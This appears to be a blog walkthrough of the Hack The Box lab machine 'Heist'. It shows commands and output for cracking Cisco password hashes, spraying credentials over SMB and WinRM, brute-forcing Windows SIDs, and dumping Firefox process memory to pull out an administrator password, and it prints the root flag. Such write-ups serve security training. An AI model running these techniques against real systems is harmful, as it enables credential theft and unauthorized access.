---
title: Hack The Box - Hiest
date: 2023-01-29
categories: [hackthebox]
tags: [windows,rpcclient,crackmapexec,impacket-lookupsid,procdump,easy]
math: true
mermaid: true
toc: true
comments: true
---
<img src="/assets/Hackthebox/Hiest/0.png"  width="50%" height="50%">

Hiest was an easy box that involved some password cracking and dumping Firefox's processes.At first, we found a Cisco configuration file on the website that contained usernames and password hashes. After recovering passwords, we found one that worked to get RPC access, through which we found more usernames.
We then got a Winrm session from one of these usernames and passwords. We observed that Firefox was running and dumped its process memory to uncover the password for the website, which also happened to be the administrator password for the system.

## RECON

## NMAP

Starting with `nmap` it shows few ports open.
- Port 80: Microsoft IIS httpd 10.0
- Port 135: Microsoft Windows RPC
- Port 445: SMB
- Port 5985: WinRM
  
```bash
$sudo nmap -sC -sV -p- --min-rate 10000 -oN hiest-all-tcp.nmap 10.10.10.149 
[sudo] password for niraz: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-09 07:32 +0545 
Nmap scan report for 10.10.10.149 
Host is up (0.079s latency). 
Not shown: 65530 filtered tcp ports (no-response) 
PORT      STATE SERVICE       VERSION 
80/tcp    open  http          Microsoft IIS httpd 10.0 
| http-methods: 
|_  Potentially risky methods: TRACE 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set 
| http-title: Support Login Page 
|_Requested resource was login.php 
|_http-server-header: Microsoft-IIS/10.0 
135/tcp   open  msrpc         Microsoft Windows RPC 
445/tcp   open  microsoft-ds? 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
|_http-title: Not Found 
|_http-server-header: Microsoft-HTTPAPI/2.0 
49669/tcp open  msrpc         Microsoft Windows RPC 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
Host script results: 
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required 
| smb2-time: 
|   date: 2023-01-09T01:49:00 
|_  start_date: N/A 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 109.73 seconds
```

## WEB - ENUMERATION
It presents a login form.

<img src="/assets/Hackthebox/Hiest/1.png"  width="50%" height="50%">

tried some basic email and password, it did not work. 

### LOGIN AS GUEST

<img src="/assets/Hackthebox/Hiest/2.png"  width="50%" height="50%">

After login as `guest`, we can see it's some kind of support portal and `hazard` has uploaded cisco router configuration file as an attachment.We can view the configuration file.
```
version 12.2 
no service pad 
service password-encryption 
! 
isdn switch-type basic-5ess 
! 
hostname ios-1 
! 
security passwords min-length 12 
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 
! 
username rout3r password 7 0242114B0E143F015F5D1E161713 
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 
! 
! 
ip ssh authentication-retries 5 
ip ssh version 2 
! 
! 
router bgp 100 
 synchronization 
 bgp log-neighbor-changes 
 bgp dampening 
 network 192.168.0.0Â mask 300.255.255.0 
 timers bgp 3 9 
 redistribute connected 
! 
ip classless 
ip route 0.0.0.0 0.0.0.0 192.168.0.1 
! 
! 
access-list 101 permit ip any any 
dialer-list 1 protocol ip list 101 
! 
no ip http server 
no ip http secure-server 
! 
line vty 0 4 
 session-timeout 600 
 authorization exec SSH 
 transport input ssh
```

From the above configuration file we can see there are three password hashes.
| Hash      | Hash Type |
| ----------- | ----------- |
| $1$pdQG$o8nrSzsGXeaduXrjlvKc91      | Cisco Type 5 salted md5       |
| 0242114B0E143F015F5D1E161713   | Cisco Type 7        |
| 02375012182C1A1D751618034F36415408 | Cisco Type 7 |

### TYPE  DECRYPT

`Type 7` password can be decrypted using any online tools. Using this [tool](https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html) to decrypt type 7 password.

```
0242114B0E143F015F5D1E161713: $uperP@ssword
02375012182C1A1D751618034F36415408:  Q4)sJu\Y8qz*A3?d
```

### TYPE 5 DECRYPT
Using `hashcat` to decrypt this hash.
```
$hashcat -m 500 hash /usr/share/wordlists/rockyou.txt

$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent  
Session..........: hashcat  
Status...........: Cracked  
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)  
Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91  
Time.Started.....: Mon Jan  9 08:11:22 2023 (8 mins, 46 secs)  
Time.Estimated...: Mon Jan  9 08:20:08 2023 (0 secs)  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:     6644 H/s (20.35ms) @ Accel:256 Loops:250 Thr:1 Vec:16  
Recovered........: 1/1 (100.00%) Digests  
Progress.........: 3543552/14344385 (24.70%)  
Rejected.........: 0/3543552 (0.00%)  
Restore.Point....: 3543040/14344385 (24.70%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000  
Candidates.#1....: steauara -> steakdi
```
now we have few usernames and passwords
```
$cat usernames.txt 
admin 
rout3r 
Hazard 

$cat passwords.txt 
Q4)sJu\Y8qz*A3?d 
@sswordf 
stealth1agent
```

### SMB - TCP 445

without creds
```
$smbmap -H 10.10.10.149 
[!] Authentication error on 10.10.10.149
```
`smbmap` gives authentication error, it means to need valid creds to view the shares.

### CRACKMAPEXEC

Using `crackmapexec` we can give a list of username and password. We'll use creds we have gather till now.
```
$cme smb -u username.txt -p password.txt --shares 10.10.10.149 
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:@sswordf STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:@sswordf STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB       10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:@sswordf STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares 
SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark 
SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------ 
SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$                          Remote Admin 
SMB         10.10.10.149    445    SUPPORTDESK      C$                              Default share 
SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
```
and we found the valid creds `Hazard:stealth1agent` . we can now re run `smbmap` with this creds.
```
$smbmap -u hazard -p stealth1agent -H 10.10.10.149 
[+] IP: 10.10.10.149:445        Name: 10.10.10.149 
        Disk                                                    Permissions     Comment 
        ----                                                    -----------     ------- 
        ADMIN$                                                  NO ACCESS       Remote Admin 
        C$                                                      NO ACCESS       Default share 
        IPC$                                                    READ ONLY       Remote IPC
```
### RPCCLIENT
```
$rpcclient -U 'hazard%stealth1agent' 10.10.10.149
```
we can get SID of user we know using `lookupnames`.
```
$rpcclient -U 'hazard%stealth1agent' 10.10.10.149 
$rpcclient $> lookupnames hazard 
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
```
we can also get user accounts using the SID.
```
$rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008 
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
```
Using rpcclient with -c command to directly interact with the command line so that we can bruteforce SIDS.
```bash
$rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c 'lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008' 
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)

$for i in {1000..1050};do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown;done 
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1) 
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1) 
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1) 
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
```
`impacket-lookupsid` can be used to bruteforce SIDs
```
$impacket-lookupsid hazard:stealth1agent@10.10.10.149 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation 
[*] Brute forcing SIDs at 10.10.10.149 
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc] 
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 
500: SUPPORTDESK\Administrator (SidTypeUser) 
501: SUPPORTDESK\Guest (SidTypeUser) 
503: SUPPORTDESK\DefaultAccount (SidTypeUser) 
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 
513: SUPPORTDESK\None (SidTypeGroup) 
1008: SUPPORTDESK\Hazard (SidTypeUser) 
1009: SUPPORTDESK\support (SidTypeUser) 
1012: SUPPORTDESK\Chase (SidTypeUser) 
1013: SUPPORTDESK\Jason (SidTypeUser)
```

we have now got few more users. updating our usernames file.
```
$cat usernames.txt 
admin 
rout3r 
Hazard 
Administrator 
Guest 
support 
chase 
Jason
```


## SHELL AS CHASE

### METASPLOIT

Using `metasploit` to find valid creds for winrm.
```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/winrm/winrm_login) >> show options 
Module options (auxiliary/scanner/winrm/winrm_login): 
   Name              Current Setting  Required  Description 
   ----              ---------------  --------  ----------- 
   BLANK_PASSWORDS   false            no        Try blank passwords for all users 
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5 
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database 
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list 
   DB_ALL_USERS      false            no        Add all users in the current database to the list 
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm) 
   DOMAIN            WORKSTATION      yes       The domain to use for Windows authentification 
   PASSWORD                           no        A specific password to authenticate with 
   PASS_FILE         passwords.txt    no        File containing passwords, one per line 
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...] 
   RHOSTS            10.10.10.149     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit 
   RPORT             5985             yes       The target port (TCP) 
   SSL               false            no        Negotiate SSL/TLS for outgoing connections 
   STOP_ON_SUCCESS   true             yes       Stop guessing when a credential works for a host 
   THREADS           1                yes       The number of concurrent threads (max one per host) 
   URI               /wsman           yes       The URI of the WinRM service 
   USERNAME                           no        A specific username to authenticate as 
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line 
   USER_AS_PASS      false            no        Try the username as the password for all users 
   USER_FILE         usernames.txt    no        File containing usernames, one per line 
   VERBOSE           true             yes       Whether to print output for all attempts 
   VHOST                              no        HTTP server virtual host 
[msf](Jobs:0 Agents:0) auxiliary(scanner/winrm/winrm_login) >> run 
[-] 10.10.10.149: - LOGIN FAILED: WORKSTATION\admin:Q4)sJu\Y8qz*A3?d (Incorrect: ) 
[-] 10.10.10.149: - LOGIN FAILED: WORKSTATION\admin:@sswordf (Incorrect: ) 
[-] 10.10.10.149: - LOGIN FAILED: WORKSTATION\admin:stealth1agent (Incorrect: ) 
[+] 10.10.10.149:5985 - Login Successful: WORKSTATION\chase:Q4)sJu\Y8qz*A3?d
```
we can see that chase can winrm. Using evil-winrm to get the shell.
```
$evil-winrm -i 10.10.10.149 -u chase -p "Q4)sJu\Y8qz*A3?d" 
Evil-WinRM shell v3.4 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

## SHELL AS ADMINISTRATOR

There's a `todo list` in the chase desktop that says to keep checking the issues list, which can be done using a browser, browsing the support portal we found earlier.
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt 
Stuff to-do: 
1. Keep checking the issues list. 
2. Fix the router config. 
Done: 
1. Restricted access for guest user.
```
running ps command we can see a bunch of `firefox process`.
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> ps 
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName 
-------  ------    -----      -----     ------     --  -- ----------- 
    347      19    10232     287536       0.17    740   1 firefox 
    401      34    39024      96248       2.30   2944   1 firefox
   1065      71   149328     227156       8.34   3916   1 firefox
    378      28    23692      60496       1.33   5876   1 firefox
    356      25    16528      39016       0.17   6408   1 firefox
```

## GET CREDS FROM FIREFOX
Using `procdump` from `sysinternals` tool to run against one of the process of `firefox`.
```
*Evil-WinRM* PS C:\Users\Chase\Documents> upload procdump64.exe
Info: Uploading procdump64.exe to C:\Users\Chase\Documents\procdump64.exe


Data: 566472 bytes of 566472 bytes copied

Info: Upload successful!
```

```
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 740 -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[20:49:10] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_230129_204910.dmp
[20:49:10] Dump 1 writing: Estimated dump file size is 288 MB.
[20:49:10] Dump 1 complete: 288 MB written in 0.4 seconds
[20:49:10] Dump count reached.
```
Downloading the dump.
```
*Evil-WinRM* PS C:\Users\Chase\Documents> download firefox.exe_230129_204910.dmp
```

Strings can be used to grep password from the dump file, and we got login usernamd and password from it.
```
$strings firefox.exe_230129_134546.dmp | grep password=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
            label-password="&fillPasswordMenu.label;"
            accesskey-password="&fillPasswordMenu.accesskey;"
            label-password="&fillPasswordMenu.label;"
            accesskey-password="&fillPasswordMenu.accesskey;"
```

and we got shell as administrator
```
$evil-winrm -i 10.10.10.149 -u administrator  -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>

*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
supportdesk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
caf30de94a7ba38168831b756dee6dea

```